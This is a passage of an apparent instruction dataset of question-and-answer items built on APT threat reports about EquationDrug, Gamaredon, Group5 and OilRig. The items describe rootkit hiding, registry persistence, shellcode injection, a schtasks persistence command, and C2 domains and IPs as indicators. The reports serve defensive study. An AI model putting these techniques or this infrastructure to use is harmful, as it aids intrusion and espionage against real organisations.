interpreted it. We are including the results for one of the con\u0141guration blocks:\nTime value: 1 year 0 months 1 days 22 hours 6 mins 52 secs. The orchestrator is expected to set this \u0141eld to the time of initial con\u0141guration.\nBinaries: 3x1024-bit encryption keys\n1b8e7818dad6345c53c2707a2c44648eee700d5cf34fea6a19a3fa0a6a871c72963fdded\n91e2703c82b7747b8793e3063700da32cfb8d907dcce1beb36edd575418d1134ef188b\n27ec3ce23711a656b0a8bf28921fbf1c39b4c90ad561e4174ed90f26ce11245bb9deb4b\n4720403f47ca865ec8bbd3c1df9d93d042ff5b52ec6\n05000000000000000000000000000000000000000000000000000000000000000000\n00000000000000000000000000000000000000000000000000000000000000000000\n00000000000000000000000000000000000000000000000000000000000000000000\n0000000000000000000000000000000000000000000000000000\ned04953f3452068ae6439f04c7904c8be5e98e66e2cd0f267d65240aeed88bd4d3c6105\nc99950dd42ccde4bc6bbaf9f6cb1b4e628d943e91f8f97f2aff705fdd25e3af6ba0bc4fd13\nd67a2bcb751bb8f21f3d4b66c599f3e572802911394d142f8cf3a299d6d4558f9f0f01634\n9afd1888472f4f8c729ffe913f670931f1a227\nC&C domain: www[dot]waeservices[dot]com\nC&C IP address: 213.198.79.49\nC&C port: 443\nTimestamp: 2010-12-08 11:35:57\nTool Reference: VTT/82055898/STEALTHFIGHTER/ 2008-10-16/14:59:06.229-04:00\nTimeoutA: 25200 sec (7 hours)\nTimeoutB: 32400 sec (9 hours)\nTimeoutC: 3600 sec (1 hour)\nTimeoutD: 172800 sec (48 hours)\n+Several Unknown Values\nOther con\u0141guration blocks we discovered contained similar information, with only some unique values:\nTimestamp: 2009-11-23 14:10:15\nTool Reference: Manual/DRINKPARSLEY/2008-09-30/10:06:46.468-04:00\nTool Reference: VTT/82053737/STRAITACID/2008-09-03/10:44:56.361-04:00\nTool Reference: STRAITSHOOTER30.ex_\nTool Reference: VTT/82051410/LUTEUSOBSTOS/2008-07-30/17:27:23.715-04:00\nTool Reference: BACKSNARF_AB25\nDuring the next step, the module obtains PE \u0141le version information from the resource section. It loads the version info using hard-coded module names, which are supposed to match the current module name:\nSVCHOST32.DLL for Windows 9x\nMSCFG32.DLL for Windows NT\nIf \u0141le version information is available, it gets language-speci\u0141c values of the PrivateBuild block. The codepage and languages that are veri\u0141ed: Unicode, LANG_NEUTRAL and LANG_ENGLISH_US. When this check passes, the module gets @default registry value from the following location:\n[HKLM\\SOFTWARE\\Classes\\CLSID\\{091FD378-422D-A36E-8487-83B57ADD2109}] TypeLib\nIf the key is not found, the code checks for registry value TypeLib in the following key:\n[HKLM\\SOFTWARE\\Classes\\CLSID\\{091FD378-422D-A36E-8487-83B57ADD2109}]\nIf such a value is found, it is then deleted along with the Version value if it exists in the same key.\nThe string obtained from one of two possible registry values is processed as if this value is a CLSID-like string: the code takes the last 16 hexadecimal digits, splits them in two 8-chars values, converts them to binary form (two DWORDs) and reverses the order of bytes in each DWORD and XORs, the \u0141rst value with 0x8ED400C0, and the second with 0x4FC2C17B.  Next, the \u0141rst DWORD value becomes second and the second becomes \u0141rst. In this order, they are stored in a structure in memory. These two values seem to be very important as they override a few values in the previously known con\u0141guration. If they don't exist, values from the current con\u0141guration replace them and are stored back in the registry following the reverse procedure:\n1. [HKLM\\SOFTWARE\\Classes\\CLSID\\{091FD378-422D-A36E-8487-83B57ADD2109}\\Version] is created and @default value is set to version obtained from \u0141le version information PrivateBuild \u0141eld (i.e. 3.04.00.0001). This seems to be used as kit version number.\n2. [HKLM\\SOFTWARE\\Classes\\CLSID\\{091FD378-422D-A36E-8487-83B57ADD2109}\\Version] is created and @default value is set to a CLSID like string generated from the following:\nFixed pre\u0141x string: \"{8C936AF9-243D-11D0-\"\nTwo important DWORD values in the format of \"%04X-%04X%08X}\" string.\nWe collected and decrypted several samples of such values. According to the code, they are initialized with values of the Microsoft \u0141letime format. So, we decided to interpret them as \u0141letime values:\n20101C04EC2C17B: 1 year(s) 7 month(s) 21 day(s) 23 hour(s) 32 min(s) 1 sec(s)\n81E01C04EC2C17B: 1 year(s) 7 month(s) 8 day(s) 12 hour(s) 13 min(s) 5 sec(s)\nE0001C04EC2C17B: 1 year(s) 7 month(s) 21 day(s) 1 hour(s) 6 min(s) 15 sec(s)\n77101C04EC2C17B: 1 year(s) 5 month(s) 20 day(s) 19 hour(s) 15 min(s) 4 sec(s)\n30F01C04EC2C17B: 1 year(s) 8 month(s) 0 day(s) 6 hour(s) 10 min(s) 33 sec(s)\nC0901C04EC2C17B: 1 year(s) 8 month(s) 2 day(s) 6 hour(s) 29 min(s) 39 sec(s)\n66701C04EC2C17B: 1 year(s) 6 month(s) 9 day(s) 2 hour(s) 10 min(s) 23 sec(s)\nF6501C04EC2C17B: 1 year(s) 6 month(s) 6 day(s) 19 hour(s) 53 min(s) 22 sec(s)\n01401C04EC2C17B: 1 year(s) 6 month(s) 25 day(s) 23 hour(s) 34 min(s) 13 sec(s)\nAfter that, the module stores current time values in encrypted form in the registry value:\n[HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys] {08DAB849-0E1EA1F0-DCF1-457081E091DB-117DB663} (encoded SHA1 of \"StartTime\")\nThe module contains an additional compressed Windows DLL \u0141le in the resource section, which is extracted as \"unilay.dll\" (see below). This DLL exports a number of functions that are just wrappers of the system API used to work with \u0141les and the registry, and also start processes and load additional DLL \u0141les.\nThe orchestrator contains several built-in plugins that form the core of the platform. These are initialized in the \u0141rst place, and then additional plugins are loaded. All the plugins are indexed in a single encrypted registry value:\n[HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys] 1\nThis value has information about all the components of the current kit. It may include Unicode strings with paths to extra DLLs which serve as plugins. Each DLL exports at least four functions which are imported by ordinal numbers from 1 to 4.\nThe structure of the registry value \"1\":\n[Count:DWORD]{ [Plugin Id:WORD][Plugin Path Length:DWORD][Plugin Path String:VARIABLE] }\n\nBased on the above text, answer a question. What are the specific actions taken by the EquationDrug orchestrator module to handle different Windows operating systems, and how does it manage to hide its presence on these systems?",
    "output": "The EquationDrug orchestrator module checks the OS version and takes specific actions based on the detected operating system. For Windows 9x, it executes the Win9x-specific function RegisterServiceProcess to hide from the Windows Task Manager. On other versions of Windows, it attempts to open a virtual device file (\\\\.\\MSSVC32 on Win9x or \\\\.\\MSNDSRV on WinNT) to activate a rootkit for its process and the file location '%SYSTEM%\\unilay.dll'. This part of the code is only executed on platforms different from WinNT 6.x (Windows Vista and later), ensuring the module remains hidden across various Windows versions.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Why might organizations, such as the World Anti-doping Agency (WADA), initially refuse to acknowledge or investigate notifications of a breach, as seen in the case of Operation Shady rat? How does this behavior impact the broader cybersecurity landscape?",
    "output": "Organizations may refuse to acknowledge or investigate breaches due to 'victim psychology,' where ignoring the problem makes it feel less real. Additionally, there may be concerns about reputational damage, legal implications, or the resources required for investigation. This behavior can significantly impact the broader cybersecurity landscape by allowing ongoing breaches to continue unchecked, leading to further data theft and potential national security issues. It also hinders collective efforts to understand and mitigate advanced persistent threats (APTs) like Operation Shady rat.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "ACTINIUM targets Ukrainian organizations\nFebruary 4, 2022\nThe Microsoft Threat Intelligence Center (MSTIC) is sharing information on a threat group named ACTINIUM, which has been operational for almost a decade and has consistently pursued access to organizations in Ukraine or entities related to Ukrainian affairs. MSTIC previously tracked ACTINIUM activity as DEV-0157, and this group is also referred to publicly as Gamaredon.\nIn the last six months, MSTIC has observed ACTINIUM targeting organizations in Ukraine spanning government, military, non-government organizations (NGO), judiciary, law enforcement, and non-profit, with the primary intent of exfiltrating sensitive information, maintaining access, and using acquired access to move laterally into related organizations. MSTIC has observed ACTINIUM operating out of Crimea with objectives consistent with cyber espionage. The Ukrainian government has (<https://ssu.gov.ua/uploads/files/DKIB/Technical%20report%20Armagedon.pdf>)publicly attributed this group to the Russian Federal Security Service (FSB).\nSince October 2021, ACTINIUM has targeted or compromised accounts at organizations critical to emergency response and ensuring the security of Ukrainian territory, as well as organizations that would be involved in coordinating the distribution of international and humanitarian aid to Ukraine in a crisis. As with any observed nation-state actor activity, Microsoft directly notifies customers of online services that have been targeted or compromised, providing them with the information they need to secure their accounts. Microsoft has shared this information with Ukrainian authorities.\nGiven the geopolitical situation and the scale of observed activity, MSTIC is prioritizing sharing our knowledge of ACTINIUM tactics, techniques, and procedures (TTPs), along with a significant number of indicators of compromise (IOCs) from our extensive analysis. Our goal is to give organizations the latest intelligence to guide investigations into potential attacks and information to implement proactive protections against future attempts.\n\nQ: How does the threat group ACTINIUM operate to achieve its objectives, and what are the primary targets and tactics used by this group?",
    "output": "A: ACTINIUM, also known as Gamaredon, is a threat group that has been operational for nearly a decade, primarily targeting organizations in Ukraine or those related to Ukrainian affairs. According to the Microsoft Threat Intelligence Center (MSTIC), ACTINIUM operates out of Crimea with objectives consistent with cyber espionage. The group aims to exfiltrate sensitive information, maintain access, and use acquired access to move laterally into related organizations. Their primary targets include government, military, non-government organizations (NGOs), judiciary, law enforcement, and non-profits. Since October 2021, ACTINIUM has specifically targeted or compromised accounts at organizations critical to emergency response, ensuring the security of Ukrainian territory, and those involved in coordinating the distribution of international and humanitarian aid to Ukraine in a crisis. The Ukrainian government has publicly attributed this group to the Russian Federal Security Service (FSB).",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Decoy Dropper 4\nalshohadaa alatfal.exe\nMD5: 2FC276E1C06C3C78C6D7B66A141213BE\nThis file is a .Net application designed to act as a decoy by displaying a window depicting images of dead children (see Figure: 5). While displaying these images, the decoy application also silently extracts an executable file from the .Net assembly's resource section, copies it to %TEMP%\\dvm.exe, and then launches a new process from this newly created file. See Figure 26 below:\nThe dropper also includes a PDB reference:\nC:\\users\\enterok\\desktop\\slideshow\\slideshow\\obj\\x86\\debug\\alshohadaa alatfal.pdb\nThe dvm.exe file is itself a .Net executable which is packed using the same .Net packer used above in the cases of Dropper Docs 1 \u2013 3. Once unpacked, the resulting file is the same crypted .Net application analysed above from Dropper Doc 3, having MD5 hash 6161083021b695814434450c1882f9f3, and containing the njRat payload.\nMedium Headline: Command and Control Server\nEach of the three distinct RAT tools used by Group5 (njRAT, NanoCore RAT, and DroidJack) were configured to communicate with a single command and control server operating on IP address 88.198.222[.]163.\nThis server was the sole point of data exfiltration for each of the malware components. As detailed above for njRAT and NanoCore, and below in (<https://citizenlab.org/2016/08/group5-syria/#appendix-b>)Appendix B for DroidJack, the TCP ports used for command and control for each of the RAT tools were as follows:\nFigure 27: RAT ports on the C2 server\nAdditionally, we believe a controller for yet another remote access trojan, XpertRAT, was also hosted on this IP in November 2015; however, we did not uncover any samples designed to communicate with this XpertRAT controller.\nAs noted in the above table, the IP address 88.198.222[.]163 is assigned to Hetzner Online, a Germany based web hosting provider. Hetzner offers web hosting services as well as virtual and dedicated server rentals. Contact was made with Hetzner technical personnel subsequent to the discovery of the malicious activity outlined in this report. A synopsis of this contact is provided in (<https://citizenlab.org/2016/08/group5-syria/#appendix-f>)Appendix F: Notification.\nCurrent data available for this IP address suggests that it was likely reprovisioned to a different Hetzner customer in early February 2016 at the latest, and then possibly again in May. A series of domain names associated with online multi-player games were directed to this Hetzner IP, one of which was apparently hosting (<https://www.virustotal.com/en/file/dd55d13621a905d0f4c4dfe84c4d2b68769debe7a79cf1ce514940306da47c25/analysis/>)a malicious HTML document.\nMedium Headline: Assadcrimes Web Hosting\nThe assadcrimes[.]info domain name was registered in June 2015, but it remained parked until early October, at which time it was migrated to an Iran-based shared web hosting provider named Hostnegar. This action coincided with the delivery of the initial e-mails outlined in Part 1.\nThe assadcrimes[.]info website was hosted on a shared hosting platform, and as such the IP address associated was also shared by a significant number of other, unrelated, websites.\nHeaders from the initial e-mail are shown below in Figure 28. These headers indicate that the initial e-mail was most likely sent using the Horde webmail application running on the web hosting server. Furthermore, the headers indicate that the sender was accessing the webmail application from the IP address of the command and control server discussed above.\nFinally, available domain name service data indicates that the assadcrimes[.]info domain name was moved back to its original parked location on May 4, 2016.\nMedium Headline: The Malicious APK \u2013 Overall Description\nUpon execution, the malware is installed and then hidden from the list of installed applications in order to remain covert.\nFigure 30 : The malicious app gives an error 'App isn't installed' when the user tries to open the malware before it disappears from the list.\nAfter the installation, the Application icon will be removed from the installed applications list, yet it will still be running in the background.\nThe APK package in question had the following characteristics:\nAdobe_Flash_Player.apk\nMD5: 8EBEB3F91CDA8E985A9C61BEB8CDDE9D\nThe discovered APK sample also contains references to both names, as shown in Figure 31 below:\nThe APK Manifest file reveals important information about the sample's capabilities and the intentions of its operator. The Android operating system requires information from the Manifest file before the application can execute. This application will request the following permissions and use the following features from the device:\nFigure 32: screenshot from Manifest file with the requested permissions for the APK\nIn the Android system, Activities are components typically used to let the user of the device perform an action. The Main Activity is also defined in the Manifest, pictured in Figure 33.\nFigure 33: Main activity defined in the manifest\nIn this case, the Main Activity is designed to start the Controller as a Service and finish. The controller will be discussed in more detail in the next section.\nAndroid applications can also have Services and Receivers defined. Services are used for background operations while Receivers define the types of broadcast messages the application can receive from other applications as well as the device. These messages are known as Intents.\nThis APK sample enables several services including \"Controller,\" \"GPSLocation\" and \"Toaster\" (See Figure 34).\nThe Controller class, referred to by the Main Activity and started as a service on the device, handles the malware operator's interaction with the application while the GPSLocation class is responsible for obtaining the GPS position from the device's LocationManager. The Toaster class is not implemented in this APK; however, it is implemented in older SandroRAT samples.\nThe APK file has several Receiver classes defined to handle specific messages from the device (See Figure 35).\nFigure 35: Defined receiver classes\nThe Connector Receiver simply starts the Controller Service when the phone boots allowing the malware to run in the background upon start up.\nThe CallListener Receiver allows the operator to log when the target makes calls, and record calls (if the operator has enabled it) as an .amr file that can then be sent to the command and control server.\nLastly, in the Manifest file, the Application enables two additional Activities, \"CAMSNAP\" and \"VIDEOCAP,\" as shown in Figure 36.\nFigure 36: Activities enabling camera and video capture\nThese allow the operator to use the infected device's camera to take pictures and record video. This activity is hidden from the victim using a translucent theme.\nMedium Headline: The Malicious APK \u2013 The Controller\nAs previously mentioned, the Controller class is ultimately responsible for the rest of the functionality. The instance we analyzed was configured to use the same host as the Windows malware for command and control communication: 88.198.222[.]163.\nFigure 37: DroidJack configuration showing that it shares a host with the other Group5 malware\nWe were able to install a test instance to learn how the malware's operator could surveil victims. It is clear that the operator would have nearly full access to the victim's information.\nFeatures offered include:\nFile browsing\nSMS and call logging\nContacts\nBrowser history\nApplication Manager\nLocation history\nWhatsApp Reader (only works on rooted devices)\nRemote camera and microphone\nSome features will only work on rooted devices. For example, the ability to read WhatsApp messages requires the victim's device to be rooted. Android apps are unable to access the data from other applications unless they are signed with the same certificate or if the app has been given permission to execute commands as root. If DroidJack is able to acquire root access it can then upload the database on the device where WhatsApp stores its message history.\nQ: How does the decoy dropper 'alshohadaa alatfal.exe' function, and what are the implications of its design for cybersecurity professionals?",
    "output": "The decoy dropper 'alshohadaa alatfal.exe' is a .Net application designed to display images of dead children while silently extracting an executable file from its resource section. This file is copied to %TEMP%\\\\dvm.exe and launched as a new process. The dropper includes a PDB reference indicating its development environment. The extracted file, dvm.exe, is a packed .Net executable containing the njRat payload. This design highlights the sophistication of the attack, as it uses emotional imagery to distract users while deploying malware. Cybersecurity professionals need to be aware of such deceptive tactics and ensure that their detection mechanisms can identify and block such multi-stage attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Fake VPN Web Portal\nIn one of the recent cases, the attackers sent the following email to individuals in targeted organisations:\nThe email was sent from a compromised account of an IT vendor. Similar emails were sent from other IT vendors in the same time period, suggesting the attackers had a foothold within their networks, or at least could get access to specific computers or email accounts.\nThe link provided in the malicious email led to a fake VPN Web Portal:\nUpon logging in with the credentials provided in the email, the victim is presented with the following page:\nThe victim is asked to install the \"VPN Client\" (an .exe file), or, if download fails, to download a password protected zip (with the same .exe file inside).\nThe \"VPN Client\" is a legitimate Juniper VPN software bundled with (<http://telussecuritylabs.com/threats/show/TSL20160530-07>)Helminth(<http://telussecuritylabs.com/threats/show/TSL20160530-07>), a malware in use by the OilRig threat agnet:\nJuniperSetupClientInstaller.exe 6a65d762fb548d2dc56cfde4842a4d3c ((<https://www.virustotal.com/en/file/a367ccb9ca5a958d012e94ae8122feda9a1a7f23a0c84e2bc5ee35c834900b61/analysis/1483354486/>)VirusTotal link)\nIf the victim downloads and installs the file, their computer would get infected, while the legitimate VPN software is installed. The legitimate and the malicious installations can be seen in the process tree when the file is run in a Cuckoo sandbox. Malicious processes are marked red (click image to enlarge):\nThe following malicious files are dropped and run:\nC:\\ProgramData\\{2ED05C38-D464-4188-BC7F-F6915DE8D764}\\OFFLINE\\9A189DFE\\C7B7C186\\main.vbs dcac79d7dc4365c6d742a49244e81fd0\nC:\\Users\\Public\\Libraries\\RecordedTV\\DnE.ps1 7fe0cb5edc11861bc4313a6b04aeedb2\nC:\\Users\\Public\\Libraries\\RecordedTV\\DnS.ps1 3920c11797ed7d489ca2a40201c66dd4\n\"C:\\Windows\\System32\\schtasks.exe\" /create /F /sc minute /mo 3 /tn \"GoogleUpdateTasksMachineUI\" /tr C:\\Users\\Public\\Libraries\\RecordedTV\\backup.vbs 7528c387f853d96420cf7e20f2ad1d32\nCommand and control server is located in the following domain:\ntecsupport[.]in\nA detailed analysis of the malware is provided in (<http://researchcenter.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/>)two (<http://researchcenter.paloaltonetworks.com/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/>)posts by Palo Alto networks and in a (<https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.html>)post by FireEye, which wrote about previous campaigns by this threat agent.\n(Note that Juniper networks was not compromised nor otherwise involved in the attack, except for the attackers using its name and publicly available software).\nBig Headline: Digitally signed malware\nThe entire bundle (VPN client and malware) was digitally signed with a valid code signing certificate issued by Symantec to AI Squared, a legitimate software company that develops accessibility software:\nThumbprint: F340C0D841F9D99DBC289151C13391000366631C Serial number: 45 E4 7F 56 0B 01 B6 4E 68 39 5E 5D 79 2F 2E 09\nAnother Helminth sample, (<https://www.virustotal.com/en/file/e404f9e9a7c4dc4cf44a4bf3e9738c10dfdc572e5184934af3ec3dd97e18b958/analysis/>)1c23b3f11f933d98febfd5a92eb5c715, was signed with a different AI Squared code signing certificate:\nThumbprint: 92B8C0872BACDC226B9CE4D783D5CCAD61C6158A Serial number:62 E0 44 E7 37 24 61 2D 79 4B 93 AF 97 46 13 48\nThis suggest that the attackers had got a hold of an Ai Squared signing key, potentially after compromising their network. Alternatively, the attackers might have got Symantec to issue them a certificate under Ai Squared's name.\n[Update 11 February 2017: In a (<http://www.aisquared.com/CertificateFix/>)notification in its website, Ai Squared says that \"The digital certificate used to certify newer ZoomText and Window-Eyes software products has been compromised. As a result, our certificate will be revoked on or around January 26th\"]\nBig Headline: University of Oxford impersonation\nThe attackers registered four domains impersonating The University of Oxford.\noxford-symposia[.]com, is a fake Oxford conference registration website. Visitors are asked to download the \"University Of Oxford Job Symposium Pre-Register Tool\":\nThe downloaded file (which is also signed with an AI Squared certificate), is a fake registration tool built by the attackers:\nOxfordSymposiumRegTool.exe f77ee804de304f7c3ea6b87824684b33\nIf run by the victim, their computer would get infected, while they are shown this registration process:\nNote that after completing the \"registration process\", the victim is asked to send the form to an email address in oxford-careers[.]com, which also belongs to the attackers.\nPreviously the fake website linked to the following documents in a third fake Oxford domain, oxford[.]in:\nhttp://oxford[.]in/downloads/ls1.doc http://oxford[.]in/downloads/ls2.doc http://oxford[.]in/downloads/ls3.doc http://oxford[.]in/downloads/ls4.do\nThe documents were unavailable during our research, and their content is unknown to us.\nThe attackers used a forth domain, oxford-employee[.]com, to host an \"Oxford Job application\" website:\nVisitors are asked to \"Download CV Creator\" in order \"To Join University of Oxford staff\". CV Creator is a malicious file hosted at http://www.oxford-careers[.]com/Files/OxfordCVCreator.exe :\nOxfordCVCreator.exe\n5713c3c01067c91771ac70e193ef5419\nWhen run, the victim is again presented with a tool created by the attackers, this time a \"University Of Oxford Official CV Creator\":\nBoth samples mentioned in this section had the following domain used for command and control:\nupdater[.]li\nBig Headline: Other incidents\nIn an earlier incident, the attackers sent a malicious excel file impersonating Israir, an Israeli Airline (the content of the file was copied from the company's public website and we have no indication of it being compromised or targeted):\nIsrael Airline.xls\n197c018922237828683783654d3c632a\nThe file had a macro that if enabled by the user would infect its computer.\nIn other incidents the attackers used the following files:\nSpecial Offers.xls / Salary Employee 2016.xls f76443385fef159e6b73ad6bf7f086d6\npic.xls\n3a5fcba80c1fd685c4b5085d9d474118\nPeople List.xls bd7d2efdb2a0f352c4b74f2b82e3c7bc\ncv.xls 72e046753f0496140b4aa389aee2e300\nusers.xls 262bc259682cb48ce66a80dcc9a5d587\nEmployee Engagement Survey.xls 726175e9aba421aa0f96cfc005664302\nJuniperSetupClientInstaller.exe f8ce7e356e09de6a48dca9e51421b6f6\nProject_Domain_No337.chm 1792cdd0c5397ff5df445d73276d1a50 ((<https://www.virustotal.com/en/file/8cb80ac1f955bac9ccf67e843ddc15322b4aa70e8c98269a8a98a02df4cbd8b7/analysis/>)undetected as malicious by any antivirus on VirusTotal)\ngcaa_report_series15561.chm d50ab63f4034c6f5eb356e3326320e66 ((<https://www.virustotal.com/en/file/172b407b28dff5b2f1110545758f15185668c305b0b371c02c8870770f4f7e7a/analysis/>)undetected as malicious by any antivirus on VirusTotal)\nBig Headline: Infrastructure overlap with Cadelle and Chafer\nIn December 2015, Symantec published a (<https://www.symantec.com/connect/blogs/iran-based-attackers-use-back-door-threats-spy-middle-eastern-targets>)post about \"two Iran-based attack groups that appear to be connected, Cadelle and Chafer\" that \"have been using Backdoor.Cadelspy and Backdoor.Remexi to spy on Iranian individuals and Middle Eastern organizations\".\nBackdoor.Remexi, one of the malware in use by Chafer, had the following command and control host:\n87pqxz159.dockerjsbin[.]com\nInterestingly, IP address 83.142.230.138, which serve as a command and control address for an OilRig related sample (3a5fcba80c1fd685c4b5085d9d474118), was pointed to by 87pqxz159.dockerjsbin[.]com as well.\nThis suggest that the two groups may actually be the same entity, or that they share resources in one why or another.\n\nAnswer this question based on the above context: How does the use of digitally signed malware by the OilRig threat agent impact the effectiveness of traditional security measures, and what additional steps can be taken to counteract this technique?",
    "output": "The use of digitally signed malware by the OilRig threat agent significantly impacts the effectiveness of traditional security measures because many security solutions rely on the presence of valid digital signatures to determine the legitimacy of software. By obtaining and using valid code signing certificates, the attackers can bypass these checks and make their malware appear legitimate. To counteract this technique, organizations should implement advanced threat detection systems that can analyze the behavior of software rather than just relying on digital signatures. Additionally, maintaining up-to-date threat intelligence and regularly reviewing and revoking compromised certificates can help mitigate the risk posed by digitally signed malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does Threat Group-3390 (TG-3390) use exfiltration techniques to steal sensitive data from its targets?",
    "output": "Exfiltration is the process of stealing data from a network without being detected. In the case of Threat Group-3390 (TG-3390), exfiltration plays a crucial role in achieving their goals. According to the analysis of TG-3390's operations, the threat actors are adept at identifying key data stores and selectively exfiltrating high-value information associated with their objectives. They use various techniques to exfiltrate data, including compressing and encrypting it to avoid detection. Specifically, TG-3390 actors have been observed using the PlugX remote access tool to exfiltrate data, as well as staging RAR archives on externally accessible web servers and issuing HTTP GET requests to retrieve the archive parts. Furthermore, the threat actors have been known to use encryption and split the RAR archives into parts to evade detection. For instance, in one intrusion, approximately 300 GB of data was exfiltrated over a month-long period. Overall, TG-3390's exfiltration techniques demonstrate their sophistication and ability to adapt to evade detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Executive Summary\nSince November, geopolitical tensions between Russia and Ukraine have escalated dramatically. It is estimated that Russia has now amassed over 100,000 troops on Ukraine's eastern border, leading some to speculate that an invasion may come next. On Jan. 14, 2022, this conflict spilled over into the cyber domain as the Ukrainian government was targeted with destructive malware ((<https://unit42.paloaltonetworks.com/ukraine-cyber-conflict-cve-2021-32648-whispergate/>)WhisperGate) and a separate vulnerability in OctoberCMS was exploited to deface several Ukrainian government websites. While attribution of those events is ongoing and there is no known link to  (aka Primitive Bear), one of the most active existing advanced persistent threats targeting Ukraine, we anticipate we will see additional malicious cyber activities over the coming weeks as the conflict evolves. We have also observed recent activity from Gamaredon. In light of this, this blog provides an update on the Gamaredon group.\nSince 2013, just prior to Russia's annexation of the Crimean peninsula, the Gamaredon group has primarily focused its cyber campaigns (<https://unit42.paloaltonetworks.com/unit-42-title-gamaredon-group-toolset-evolution/>)against Ukrainian government officials and organizations. In 2017, Unit 42 published its first research documenting Gamaredon's evolving toolkit and naming the group, and over the years, several researchers have noted that the operations and targeting activities of this group align with Russian interests. This link was recently substantiated on Nov. 4, 2021, when the Security Service of Ukraine (SSU) (<https://www.bleepingcomputer.com/news/security/ukraine-links-members-of-gamaredon-hacker-group-to-russian-fsb/>)publicly attributed the leadership of the group to five Russian Federal Security Service (FSB) officers assigned to posts in Crimea. Concurrently, the SSU also released an updated (<https://ssu.gov.ua/uploads/files/DKIB/Technical%20report%20Armagedon.pdf>)technical report documenting the tools and tradecraft employed by this group.\nGiven the current geopolitical situation and the specific target focus of this APT group, Unit 42 continues to actively monitor for indicators of their operations. In doing so, we have mapped out three large clusters of their infrastructure used to support different phishing and malware purposes. These clusters link to over 700 malicious domains, 215 IP addresses and over 100 samples of malware.\nMonitoring these clusters, we observed an attempt to compromise a Western government entity in Ukraine on Jan. 19, 2022. We have also identified potential malware testing activity and reuse of historical techniques involving open-source virtual network computing (VNC) software. The sections below offer an overview of our findings in order to aid targeted entities in Ukraine as well as cybersecurity organizations in defending against this threat group.\nUpdate Feb. 16: When we originally published this report, we noted, \"While we have mapped out three large clusters of currently active Gamaredon infrastructure, we believe there is more that remains undiscovered.\" We have since discovered hundreds more Gamaredon-related domains, including known related-clusters, and also new clusters. We have updated our (<https://unit42.paloaltonetworks.com/gamaredon-primitive-bear-ukraine-update-2021/#indicators-of-compromise>)Indicators of Compromise (IoCs) to include these additional domains and cluster observations.\nFull visualization of the techniques observed, relevant courses of action and IoCs related to this Gamaredon report can be found in the (<https://unit42.paloaltonetworks.com/atoms/gamaredon/>)Unit 42 ATOM viewer.\nPalo Alto Networks customers receive protections against the types of threats discussed in this blog by products including and the , , (<https://www.paloaltonetworks.com/network-security/advanced-url-filtering>)Advanced URL Filtering and (<https://www.paloaltonetworks.com/network-security/dns-security>)DNS Security subscription services for the .\nRelated Unit 42 Topics ,\nAnswer this question: How has the Gamaredon group evolved its toolkit and targeting activities since its inception in 2013, and how does this evolution align with Russian interests?",
    "output": "The Gamaredon group, also known as Primitive Bear, has been active since 2013 and has primarily targeted Ukrainian government officials and organizations. Over the years, the group has evolved its toolkit, as documented by Unit 42 in 2017. Several researchers have noted that the operations and targeting activities of this group align with Russian interests. This alignment was substantiated on November 4, 2021, when the Security Service of Ukraine (SSU) publicly attributed the leadership of the group to five Russian Federal Security Service (FSB) officers assigned to posts in Crimea. The SSU also released an updated technical report documenting the tools and tradecraft employed by this group. The group's focus on Ukrainian targets and its evolution in tactics, techniques, and procedures (TTPs) demonstrate a strategic alignment with Russian geopolitical objectives.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Kernel mode stage 0 (Windows 9x) - mssvc32.vxd\nThis VXD driver handles only two control messages: W32_DeviceIoControl and Dynamic_Init. The DeviceIoControl part is not completely implemented and the driver is only able to check for some known control codes.  However it does nothing. This handler looks more like a code stub rather than actual payload.\nOn the Dynamic_Init event, the driver retrieves the location of the user-mode loader executable from the following registry value:\n[HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys] Con\u0141g\nIf the value is not present in the registry, it uses the following fallback string hardcoded in the binary:\nC:\\WINDOWS\\SYSTEM\\SVCHOST32.EXE\nNext, it installs a callback procedure using Windows function _SHELL_CallAtAppyTime. This procedure will be called when CPU is running in ring-3 mode, so that a new executable (loader process) can be started via the traditional way. This is a standard trick that was used by developers in the 90s to initiate a call to DLL export in ring-3 from ring-0 in Windows 9x OS family.\nBig Headline: Kernel mode stage 0 and rootkit (Windows 2000 and above) - msndsrv.sys\nFormat PE32 Native\nCompiled 2008.01.23 14:12:33 (GMT)\nLocation %System32%\\drivers\\msndsrv.sys\nThis module can create log \u0141les in the following known locations:\n%systemroot%\\system32\\mslog32.dat\n%systemroot%\\system32\\msperf32.dat (default location)\nThe driver acts as the \u0141rst stage of the EquationDrug platform on Windows 2000+ and implements rootkit functions for hiding the components of the platform. Additionally, it implements a NDIS driver for \u0141ltering network traf\u0141c.\nWhen started and initialized, the driver retrieves the location of the user-mode loader executable from the registry value:\n[HKLM\\System\\CurrentControlSet\\Services\\%driver name%] Con\u0141g\nThe %driver name% is not hardcoded and is obtained dynamically from the current module name, which means that different instances may check different registry keys and this may not be a reliable way to check for infection. The sample we analyzed used \"msndsrv\" as the %driver name%.\nNext, it crafts and injects a shellcode in \"services.exe\" or \"winlogon.exe\". The shellcode is designed to spawn the loader process from the executable called \"mscfg32.exe\".\nThe rootkit code in the driver hooks several Native API functions that lets it hide or protect registry keys, \u0141les and running processes. The components of EquationDrug can modify the list of protected objects by sending DeviceIoControl messages to the driver. The driver also maintains a persistent list of protected objects that is stored in the following registry values:\n[HKLM\\System\\CurrentControlSet\\Services\\%driver name%] 1\n[HKLM\\System\\CurrentControlSet\\Services\\%driver name%] 2\nThese values are also protected by the rootkit. They can be revealed by booting Windows in Safe Mode.\nThe driver contains the following unused 